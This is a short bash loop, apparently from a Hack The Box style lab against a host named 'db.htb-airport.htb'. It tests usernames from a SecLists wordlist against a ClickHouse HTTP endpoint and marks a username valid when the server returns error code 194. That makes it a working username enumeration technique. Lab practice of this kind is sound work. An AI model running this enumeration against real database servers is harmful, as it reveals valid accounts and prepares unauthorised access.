   while read u; do
     code=$(curl -s "http://db.htb-airport.htb/?query=SELECT+1" \
       -H "X-ClickHouse-User: $u" -H "X-ClickHouse-Key: x" \
       | grep -oE 'Code: [0-9]+' | head -1)
     [ "$code" = "Code: 194" ] && echo "VALID: $u"
   done < /home/wiseman/hacking/seclists/Usernames/top-usernames-shortlist.txt
